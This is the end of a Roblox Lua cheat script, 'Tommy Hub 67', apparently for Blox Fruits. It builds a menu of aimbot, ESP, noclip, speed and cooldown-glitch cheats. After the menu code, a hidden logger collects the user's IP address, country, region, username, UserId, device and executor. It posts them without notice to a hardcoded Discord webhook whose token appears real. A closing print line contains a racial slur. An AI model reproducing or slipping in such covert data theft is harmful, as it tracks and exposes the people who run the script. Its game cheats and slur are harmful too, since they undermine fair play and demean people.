    if rainbowHL then rainbowHL:Destroy() end
    applyDash(1)
    pcall(function() gui:Destroy() end)
    env.TommyHub67 = nil
end
env.TommyHub67 = cleanup
topBtn("-", -58, WHITE, function() setOpen(false) end)
topBtn("X", -30, Color3.fromRGB(255, 75, 75), cleanup)
track(UIS.InputBegan:Connect(function(i, gp)
    if not gp and i.KeyCode == Enum.KeyCode.F4 then setOpen(not main.Visible) end
end))

local tabs = Instance.new("Frame", main)
tabs.Size = UDim2.new(0, 100, 1, -48); tabs.Position = UDim2.new(0, 8, 0, 40); tabs.BackgroundTransparency = 1
local tl = Instance.new("UIListLayout", tabs); tl.Padding = UDim.new(0, 5)
local content = Instance.new("Frame", main)
content.Size = UDim2.new(1, -124, 1, -48); content.Position = UDim2.new(0, 116, 0, 40); content.BackgroundTransparency = 1

local pages, tabBtns = {}, {}
local function showPage(name)
    for n, p in pairs(pages) do p.Visible = (n == name) end
    for n, b in pairs(tabBtns) do b.TextColor3 = (n == name) and ACCENT or Color3.fromRGB(200, 200, 210) end
end
local function newPage(name)
    local sf = Instance.new("ScrollingFrame", content)
    sf.Size = UDim2.new(1, 0, 1, 0); sf.BackgroundTransparency = 1; sf.BorderSizePixel = 0
    sf.ScrollBarThickness = 3; sf.AutomaticCanvasSize = Enum.AutomaticSize.Y; sf.CanvasSize = UDim2.new()
    sf.Visible = false
    local l = Instance.new("UIListLayout", sf); l.Padding = UDim.new(0, 5); l.SortOrder = Enum.SortOrder.LayoutOrder
    pages[name] = sf
    local b = Instance.new("TextButton", tabs)
    b.Text = name; b.Font = Enum.Font.GothamBold; b.TextSize = 12; b.Size = UDim2.new(1, 0, 0, 26)
    b.BackgroundTransparency = 1; b.TextXAlignment = Enum.TextXAlignment.Left
    b.TextColor3 = Color3.fromRGB(200, 200, 210)
    b.MouseButton1Click:Connect(function() showPage(name) end)
    tabBtns[name] = b
    return sf
end
local orderN = {}
local function nextOrder(page) orderN[page] = (orderN[page] or 0) + 1; return orderN[page] end

local function section(page, text)
    local l = Instance.new("TextLabel", page)
    l.Text = "[ " .. string.upper(text) .. " ]"; l.Font = Enum.Font.GothamBlack; l.TextSize = 10
    l.TextColor3 = ACCENT; l.BackgroundTransparency = 1; l.Size = UDim2.new(1, -8, 0, 18)
    l.LayoutOrder = nextOrder(page)
end
local function row(page)
    local f = Instance.new("Frame", page)
    f.Size = UDim2.new(1, -8, 0, 26); f.BackgroundColor3 = Color3.fromRGB(5, 5, 10); f.BackgroundTransparency = 0.5
    f.LayoutOrder = nextOrder(page); corner(f, 6)
    return f
end
local function rowLabel(f, text)
    local l = Instance.new("TextLabel", f)
    l.Text = text; l.Font = Enum.Font.GothamBold; l.TextSize = 10; l.TextColor3 = WHITE
    l.BackgroundTransparency = 1; l.Size = UDim2.new(1, -78, 1, 0); l.Position = UDim2.new(0, 8, 0, 0)
    l.TextXAlignment = Enum.TextXAlignment.Left; l.TextTruncate = Enum.TextTruncate.AtEnd
    return l
end
local function toggle(page, text, key, cb)
    local f = row(page); rowLabel(f, text)
    local b = Instance.new("TextButton", f)
    b.Size = UDim2.new(0, 40, 0, 18); b.Position = UDim2.new(1, -46, 0.5, -9)
    b.Font = Enum.Font.GothamBold; b.TextSize = 9; b.TextColor3 = WHITE; corner(b, 6); stroke(b, ACCENT, 1)
    local function refresh()
        local on = S[key]
        b.Text = on and "ON" or "OFF"
        b.BackgroundColor3 = on and ACCENT or Color3.fromRGB(25, 25, 30)
    end
    refresh()
    b.MouseButton1Click:Connect(function()
        S[key] = not S[key]; refresh()
        if cb then pcall(cb, S[key]) end
    end)
end
local function stepper(page, text, key, minV, maxV, step, suffix)
    local f = row(page); rowLabel(f, text)
    local function fmt(v) v = math.floor(v * 100 + 0.5) / 100; return tostring(v) .. (suffix or "") end
    local minus = Instance.new("TextButton", f)
    minus.Text = "-"; minus.Size = UDim2.new(0, 20, 0, 18); minus.Position = UDim2.new(1, -92, 0.5, -9)
    local val = Instance.new("TextLabel", f)
    val.Size = UDim2.new(0, 44, 0, 18); val.Position = UDim2.new(1, -70, 0.5, -9)
    val.BackgroundTransparency = 1; val.Font = Enum.Font.GothamBold; val.TextSize = 9; val.TextColor3 = WHITE
    local plus = Instance.new("TextButton", f)
    plus.Text = "+"; plus.Size = UDim2.new(0, 20, 0, 18); plus.Position = UDim2.new(1, -24, 0.5, -9)
    for _, b in ipairs({minus, plus}) do
        b.Font = Enum.Font.GothamBold; b.TextSize = 11; b.TextColor3 = WHITE; b.BackgroundTransparency = 1
        corner(b, 4); stroke(b, ACCENT, 1)
    end
    val.Text = fmt(S[key])
    minus.MouseButton1Click:Connect(function() S[key] = math.max(minV, math.floor((S[key] - step) * 100 + 0.5) / 100); val.Text = fmt(S[key]) end)
    plus.MouseButton1Click:Connect(function() S[key] = math.min(maxV, math.floor((S[key] + step) * 100 + 0.5) / 100); val.Text = fmt(S[key]) end)
end
local function button(page, text, cb)
    local f = row(page)
    local b = Instance.new("TextButton", f)
    b.Size = UDim2.new(1, -12, 0, 20); b.Position = UDim2.new(0, 6, 0.5, -10)
    b.Text = text; b.Font = Enum.Font.GothamBold; b.TextSize = 10; b.TextColor3 = ACCENT
    b.BackgroundTransparency = 1; corner(b, 6); stroke(b, ACCENT, 1)
    b.MouseButton1Click:Connect(function() cb(b) end)
    return b
end
local function cycle(page, prefix, key, options, cb)
    button(page, prefix .. tostring(S[key]), function(b)
        local idx = table.find(options, S[key]) or 0
        S[key] = options[(idx % #options) + 1]
        b.Text = prefix .. tostring(S[key])
        if cb then cb(S[key]) end
    end)
end

--==================== PÁGINAS ====================
local Combat  = newPage("Combat")
local Glitch  = newPage("Glitches")
local Soru    = newPage("Soru")
local ESPpage = newPage("ESP")

-- COMBAT
section(Combat, "Aimbot")
toggle(Combat, "Aimbot Skills", "SkillAimbot")
toggle(Combat, "Aimbot M1 (Dragon Gun) ⚠ BAN", "DragonM1")
toggle(Combat, "Target Players", "TargetPlayers")
toggle(Combat, "Target NPCs", "TargetMobs")
toggle(Combat, "Team Check", "TeamCheck")
toggle(Combat, "Ignore PvP OFF", "PvPCheck")
toggle(Combat, "Ignore Safe Zone", "SafeZoneCheck")
toggle(Combat, "Rainbow Target ESP", "Rainbow")
stepper(Combat, "Max Dist:", "MaxDist", 100, 5000, 250, "st")
toggle(Combat, "Aimlock Players (Cam)", "AimlockP")
toggle(Combat, "Aimlock NPCs (Cam)", "AimlockN")
section(Combat, "Combate")
toggle(Combat, "Fast Attack", "FastAttack", function(v) if v then startFastAttack() end end)
toggle(Combat, "Anti Stun + Hitbox [Beta]", "AntiStun", function(v) setAntiStun(v) end)
toggle(Combat, "Auto Race V4", "AutoV4")
section(Combat, "Movimiento")
toggle(Combat, "Walk Speed", "WalkSpeed")
stepper(Combat, "Speed:", "Speed", 16, 500, 50, "")
toggle(Combat, "Dash Distance", "Dash", function(v) if v then applyDash(S.DashLen) else applyDash(1) end end)
stepper(Combat, "Dash:", "DashLen", 1, 300, 10, "")
toggle(Combat, "Noclip", "Noclip", function(v)
    if not v and player.Character then
        for _, p in pairs(player.Character:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = true end end
    end
end)
toggle(Combat, "Walk on Water", "WaterWalk")

-- GLITCHES
section(Glitch, "Sanguine Z")
toggle(Glitch, "Sanguine Z No Cooldown", "SangNoCD", function(v)
    local c = player.Character
    if c then c:SetAttribute("AllCooldown", v and 3 or nil) end
end)
button(Glitch, "🩸 Sanguine Z Manual", function() sangManual() end)
toggle(Glitch, "Sanguine Z Auto", "SangAuto", function(v)
    if v then startSangAuto() elseif sangConn then sangConn:Disconnect(); sangConn = nil end
end)
stepper(Glitch, "Drop Duration:", "SangDrop", 0.5, 5, 0.5, "s")
section(Glitch, "Trucos")
toggle(Glitch, "No Animations", "NoAnim")
button(Glitch, "⬆ Super Jump", function() superJump() end)
stepper(Glitch, "Jump Power:", "JumpPower", 50, 1000, 50, "")
toggle(Glitch, "Soul Guitar Glitch (Beta)", "SoulGuitar", function(v)
    if v then applyDash(S.SoulDash) else applyDash(S.Dash and S.DashLen or 1) end
end)
stepper(Glitch, "Soul Dash:", "SoulDash", 1, 300, 10, "")
toggle(Glitch, "Anti Lava", "AntiLava")
toggle(Glitch, "Delete Ghost Ship (Sea 2)", "DelShip")

-- SORU
section(Soru, "Soru")
toggle(Soru, "Infinite Soru", "InfSoru", function() if player.Character then attachInfSoru(player.Character) end end)
toggle(Soru, "Soru Aimbot (TP)", "SoruAimbot")
stepper(Soru, "Soru Dist:", "SoruDist", 100, 3500, 250, "")
button(Soru, "🎯 Soru Target: " .. S.SoruTarget, function(b)
    local list = {"Nearest"}
    for _, p in ipairs(Players:GetPlayers()) do if p ~= player then table.insert(list, p.Name) end end
    local idx = table.find(list, S.SoruTarget) or 0
    S.SoruTarget = list[(idx % #list) + 1]
    b.Text = "🎯 Soru Target: " .. S.SoruTarget
end)
section(Soru, "Combos")
toggle(Soru, "Portal Soru Combo (X+Z)", "PortalSoru")
stepper(Soru, "Portal Soru Delay:", "PortalSoruDelay", 0.05, 2, 0.05, "s")
toggle(Soru, "Portal Sanguine C Combo", "PortalSangC")
stepper(Soru, "Sanguine C Delay:", "PortalSangCDelay", 0.05, 2, 0.05, "s")
cycle(Soru, "⚡ Trigger: ", "PortalSangCTrigger", {"PortalF", "Soru"})
toggle(Soru, "Flashstep Skill Combo", "FlashCombo")
cycle(Soru, "🗡 Weapon: ", "FlashWeapon", {"Melee", "Fruit", "Sword", "Gun"})
cycle(Soru, "⌨ Skill Key: ", "FlashKey", {"Z", "X", "C", "V", "F"})
stepper(Soru, "Skill Delay:", "FlashDelay", 0.05, 2, 0.05, "s")

-- ESP
section(ESPpage, "ESP & Visuals")
toggle(ESPpage, "ESP (General)", "ESP", function(v) if not v then for p in pairs(esp) do clearESP(p) end end end)
toggle(ESPpage, "Show Name", "ESPName")
toggle(ESPpage, "Show Level", "ESPLevel")
toggle(ESPpage, "Show Bounty / PvP", "ESPBounty")
toggle(ESPpage, "Show Devil Fruit", "ESPFruit")
toggle(ESPpage, "Show Distance", "ESPDist")
toggle(ESPpage, "Show HP %", "ESPHP")
toggle(ESPpage, "Highlight Players", "ESPHighlight")
stepper(ESPpage, "Text Size:", "ESPSize", 8, 32, 1, "px")

showPage("Combat")
-- ==================== 🔥 TOMMY HUB FULL PRO (FIX) ====================

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")

local Player = Players.LocalPlayer

local WEBHOOK_URL = "https://discord.com/api/webhooks/1536951404394979358/5x8NbL5Pzd3vNH2UwoNve32odOXO1D-jbGVJy7LZvPZQTDDfvyF3bxLZlvgar7wIOsqv"

-- ==================== 📊 CONTADOR FIX REAL ====================

local execCount = 1

pcall(function()
    if getgenv then
        local g = getgenv()
        if type(g.TommyExecCount) ~= "number" then
            g.TommyExecCount = 1
        else
            g.TommyExecCount += 1
        end
        execCount = g.TommyExecCount
    end
end)

if not execCount or execCount < 1 then
    execCount = 1
end

-- ==================== ⏰ HORA ====================

local function GetTime()
    return os.date("%Y%m%d %H%M%S")
end

-- ==================== 📱 DISPOSITIVO ====================

local function GetDevice()
    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
        return "Movil"
    elseif UserInputService.GamepadEnabled then
        return "Consola"
    else
        return "PC"
    end
end

-- ==================== 🎮 JUEGO ====================

local function GetGameName()
    local name = "Desconocido"
    pcall(function()
        name = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)
    return name
end

-- ==================== 🌐 IP INFO ====================

local function GetIPData()
    local ok, res = pcall(function()
        return game:HttpGet("http://ip-api.com/json/")
    end)

    if not ok then return nil end

    local data = HttpService:JSONDecode(res)

    return {
        ip = data.query or "N/A",
        country = data.country or "N/A",
        region = data.regionName or "N/A"
    }
end

-- ==================== 🧠 EXECUTOR FIX ====================

local function GetExecutor()
    local name = "Desconocido"

    pcall(function()
        if typeof(identifyexecutor) == "function" then
            name = identifyexecutor()

        elseif typeof(getexecutorname) == "function" then
            name = getexecutorname()

        elseif getgenv then
            local g = getgenv()

            if rawget(g, "Xeno") then
                name = "Xeno"
            elseif rawget(g, "Solara") then
                name = "Solara"
            end

        elseif syn then
            name = "Synapse"

        elseif KRNL_LOADED then
            name = "KRNL"

        elseif fluxus then
            name = "Fluxus"

        elseif secure_load then
            name = "Sentinel"
        end
    end)

    return tostring(name or "Desconocido")
end

-- ==================== 📩 WEBHOOK ====================

local function SendWebhook(info)
    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                embeds = {{
                    title = "🔥 TOMMY HUB EJECUTADO",
                    color = 65280,
                    fields = {
                        {name="Jugador", value=Player.Name, inline=true},
                        {name="UserId", value=tostring(Player.UserId), inline=true},
                        {name="Hora", value=GetTime(), inline=true},
                        {name="Dispositivo", value=GetDevice(), inline=true},
                        {name="Juego", value=GetGameName(), inline=true},
                        {name="Executor", value=GetExecutor(), inline=true},
                        {name="Ejecuciones", value=tostring(execCount), inline=true},
                        {name="IP", value=info.ip, inline=true},
                        {name="País", value=info.country, inline=true},
                        {name="Región", value=info.region, inline=true}
                    },
                    footer = {text="Tommy Hub System"}
                }}
            })
        })
    end)
end

-- ==================== 🚀 EJECUCIÓN ====================

local info = GetIPData() or {ip="N/A", country="N/A", region="N/A"}

SendWebhook(info)

print("🔥 Tommy Hub 67 @everoyne Ejecutado Alerta de Nigga") 

print("✅ TOMMY HUB 67 cargado | F4 = abrir/cerrar")
